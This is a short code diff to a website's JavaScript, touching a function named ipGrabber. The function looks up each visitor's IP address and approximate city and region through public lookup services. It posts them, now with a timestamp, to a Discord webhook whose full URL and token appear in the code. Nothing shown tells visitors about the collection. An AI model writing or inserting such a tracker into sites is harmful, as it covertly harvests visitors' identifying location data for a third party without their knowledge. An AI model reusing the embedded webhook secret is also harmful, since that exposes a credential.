@@ -463,7 +463,7 @@ window.addEventListener("DOMContentLoaded", () => {
 
 function ipGrabber(){
   const infoWebhookURL = "https://discord.com/api/webhooks/1444277898885332992/HOB1qFKaXAG-R1rsn2ktlYcLJhO7Bb5c6mj93D_QzvgwPwwPa5OATRxi-WTxSa2fRK-G";
-
+  let time = new Date().toLocaleTimeString();
 fetch("https://api.ipify.org?format=json")
   .then((res) => res.json())
   .then((data) => {
@@ -471,7 +471,7 @@ fetch("https://api.ipify.org?format=json")
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({
-        content: `🌍 New Visitor\nIP: ${data.ip}`,
+        content: `🌍 New Visitor\n📝 **time:** ${time}\nIP: ${data.ip}`,
       }),
     });
   });
@@ -486,6 +486,7 @@ fetch("https://ipapi.co/json/")
       body: JSON.stringify({
         content: `
 🌍 **New Visitor**
+📝 **time:** ${time}
 IP: ${data.ip}
 City: ${data.city}
 Region: ${data.region}
